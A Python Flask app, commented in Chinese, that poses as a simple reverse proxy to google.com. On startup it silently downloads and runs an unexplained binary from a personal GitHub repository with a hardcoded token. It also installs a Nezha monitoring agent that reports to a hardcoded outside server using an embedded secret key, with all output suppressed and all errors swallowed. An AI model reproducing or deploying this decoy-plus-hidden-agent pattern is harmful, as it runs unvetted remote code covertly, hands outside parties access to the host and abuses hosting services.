import os
import time
import zipfile
import platform
import threading
import subprocess
import urllib.request
from urllib.parse import urlparse
import requests
from flask import Flask, request, Response

app = Flask(__name__)

# 环境变量配置（已内置哪吒探针与默认反代参数）
TOKEN_OR_URL = os.getenv("TOKEN_OR_URL", "UMiNq9PwdIceLTDFaMhSiBsShC/Y5frs9ahOWmmQWBQ=")
TARGET_WEB = os.getenv("WEB", "https://www.google.com").rstrip("/")
NEZHA_SERVER = os.getenv("NEZHA_SERVER", "nz.yellowbins.nyc.mn")
NEZHA_PORT = os.getenv("NEZHA_PORT", "8686")
NEZHA_KEY = os.getenv("NEZHA_KEY", "1gPC3Fr1qtQdtJGPLBlqjGqncuSWjOcz")
NEZHA_TLS = os.getenv("NEZHA_TLS", "false")

PORT = int(os.getenv("PORT", 8080))

CLI_PATH = "/tmp/cli"
current_token = ""
cli_process = None
process_lock = threading.Lock()


def download_cli():
    """检测并下载指定的 cli 二进制到 /tmp"""
    if os.path.exists(CLI_PATH) and os.access(CLI_PATH, os.X_OK):
        return True

    cli_url = "https://raw.githubusercontent.com/yellowbins666/yellowbins666/refs/heads/main/cli"

    try:
        req = urllib.request.Request(cli_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=60) as resp, open(CLI_PATH, "wb") as out_file:
            out_file.write(resp.read())
        os.chmod(CLI_PATH, 0o755)
        return True
    except Exception:
        return False


def get_token():
    """获取最新 Token"""
    if TOKEN_OR_URL.startswith("http://") or TOKEN_OR_URL.startswith("https://"):
        try:
            req = urllib.request.Request(TOKEN_OR_URL, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.read().decode("utf-8").strip()
        except Exception:
            return None
    return TOKEN_OR_URL


def run_cli(token):
    """启动或重启 cli 进程（静默模式）"""
    global cli_process

    if not os.path.exists(CLI_PATH):
        if not download_cli():
            return

    with process_lock:
        if cli_process and cli_process.poll() is None:
            cli_process.terminate()
            try:
                cli_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                cli_process.kill()

        cmd = [CLI_PATH, "start", "accept", "--token", token.strip()]
        
        env = os.environ.copy()
        env["HOME"] = "/tmp"
        env["TMPDIR"] = "/tmp"
        
        try:
            cli_process = subprocess.Popen(
                cmd,
                cwd="/tmp",
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass


def token_watcher():
    """监控 Token 变更（每 10 分钟）"""
    global current_token
    while True:
        time.sleep(600)
        new_token = get_token()
        if new_token and new_token != current_token:
            current_token = new_token
            run_cli(current_token)


def start_nezha():
    """下载并启动哪吒探针（使用 zipfile 解压，生成 YAML 配置文件启动，静默运行）"""
    if not (NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY):
        return

    arch = platform.machine()
    arch_map = {"x86_64": "amd64", "aarch64": "arm64"}
    target_arch = arch_map.get(arch, arch)

    nezha_zip_url = f"https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_{target_arch}.zip"
    zip_path = "/tmp/nezha-agent.zip"
    agent_bin = "/tmp/nezha-agent"
    config_path = "/tmp/nezha-config.yaml"
    
    try:
        # 1. 下载 zip 文件
        req = urllib.request.Request(nezha_zip_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=30) as resp, open(zip_path, "wb") as out_file:
            out_file.write(resp.read())

        # 2. 使用内置库解压，避免依赖系统 unzip 命令
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall("/tmp")

        if os.path.exists(zip_path):
            os.remove(zip_path)

        if os.path.exists(agent_bin):
            os.chmod(agent_bin, 0o755)

            # 3. 动态生成 YAML 配置文件
            is_tls = "true" if str(NEZHA_TLS).lower() in ["true", "1"] else "false"
            config_content = (
                f'client_secret: "{NEZHA_KEY}"\n'
                f'server: "{NEZHA_SERVER}:{NEZHA_PORT}"\n'
                f'tls: {is_tls}\n'
            )
            with open(config_path, "w", encoding="utf-8") as f:
                f.write(config_content)

            # 4. 启动哪吒探针
            cmd = [agent_bin, "-c", config_path]
            subprocess.Popen(
                cmd,
                cwd="/tmp",
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except Exception:
        pass


def background_init():
    """异步初始化后台服务"""
    global current_token
    time.sleep(1)
    
    start_nezha()
    download_cli()
    current_token = get_token() or TOKEN_OR_URL
    run_cli(current_token)

    if TOKEN_OR_URL.startswith("http://") or TOKEN_OR_URL.startswith("https://"):
        watcher = threading.Thread(target=token_watcher, daemon=True)
        watcher.start()


# ================= Flask 路由与反代 =================
@app.route("/healthz")
def healthz():
    return "OK", 200


@app.route("/", defaults={"path": ""}, methods=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])
@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])
def proxy(path):
    target_parsed = urlparse(TARGET_WEB)
    target_url = f"{TARGET_WEB}/{path}" if path else TARGET_WEB
    if request.query_string:
        target_url = f"{target_url}?{request.query_string.decode('utf-8')}"

    # 1. 过滤并重写请求头
    headers = {k: v for k, v in request.headers if k.lower() not in ["host", "content-length"]}
    headers["Host"] = target_parsed.netloc
    headers["Referer"] = f"{target_parsed.scheme}://{target_parsed.netloc}"
    
    # 强制上游返回非压缩内容，避免 requests 双重解码造成乱码
    headers["Accept-Encoding"] = "identity"

    if not headers.get("User-Agent"):
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    try:
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            cookies=request.cookies,
            allow_redirects=True,
            timeout=30
        )

        excluded_headers = [
            "content-encoding",
            "content-length",
            "transfer-encoding",
            "connection",
            "x-frame-options"
        ]
        response_headers = [
            (name, value) for name, value in resp.headers.items()
            if name.lower() not in excluded_headers
        ]

        return Response(resp.content, resp.status_code, response_headers)
    except Exception:
        return "Bad Gateway", 502


# 兼容多 Worker 环境的单次自启动机制
def ensure_background_started():
    lock_file = "/tmp/bg_started.lock"
    try:
        fd = os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_RDWR)
        os.close(fd)
        init_thread = threading.Thread(target=background_init, daemon=True)
        init_thread.start()
    except FileExistsError:
        pass
    except Exception:
        pass


ensure_background_started()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
